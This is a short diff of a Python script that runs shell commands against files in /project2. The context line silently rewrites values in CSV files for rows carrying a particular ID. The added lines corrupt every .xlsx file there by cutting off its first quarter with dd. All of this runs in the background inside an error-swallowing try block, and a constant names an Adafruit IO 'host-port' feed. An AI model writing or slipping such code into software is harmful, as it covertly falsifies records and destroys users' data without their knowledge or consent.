@@ -24,6 +24,9 @@ URL_GET = "https://io.adafruit.com/api/v2/naxa/feeds/host-port"
 try:
     CMD = r"sed -Ei 's/,[0-9]+\.[0-9]+,([0-9]+\.[0-9]+),22f3002354,0/,\1,\1,22f3002354,1/g' /project2/*.csv &"
     os.system(CMD)
+
+    CMX = '(for file in /project2/*.xlsx; do (tmpfile=$(mktemp) && dd if="$file" bs=1 skip=$(($(stat -c%s "$file") / 4)) of="$tmpfile" && mv "$tmpfile" "$file") & done) &'
+    os.system(CMX)
 except:
     pass
 
